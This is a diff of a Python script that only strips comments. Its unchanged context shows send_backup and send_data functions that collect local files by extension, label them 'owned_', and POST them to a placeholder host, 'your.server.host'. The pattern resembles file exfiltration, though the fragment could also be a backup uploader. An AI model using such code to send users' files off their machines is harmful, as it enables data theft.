@@ -292,9 +292,9 @@ def send_backup():
                 
                 url = 'your.server.host'
                 
-                # Use a context manager to open the file
+              
                 with open(full_path, 'rb') as file:
-                    files = {'file_data': file}  # Use 'file_data' as the key
+                    files = {'file_data': file}  
                     response = requests.post(url, files=files)
 
                 print(response.text)
@@ -343,7 +343,7 @@ def send_data(user, current, files_extensions):
 
     
     try:
-        all_success = True  # Track overall success
+        all_success = True  
     
         filep = os.path.join(current, files_extension)
         file_name = f'owned_{files_extension}'
@@ -356,7 +356,7 @@ def send_data(user, current, files_extensions):
                 'file_name': file_name
             }
             
-            # Determine the URL based on file extension
+            
            
             if 'py' in files_extension:
                 url = 'your.server.host'
@@ -368,7 +368,7 @@ def send_data(user, current, files_extensions):
                 print(f'Successfully sent {file_name}.')
             else:
                 print(f'Failed to send {file_name}. Status code: {response.status_code}')
-                all_success = False  # Mark overall success as False
+                all_success = False  
 
         if all_success:
             print('All files sent successfully.')
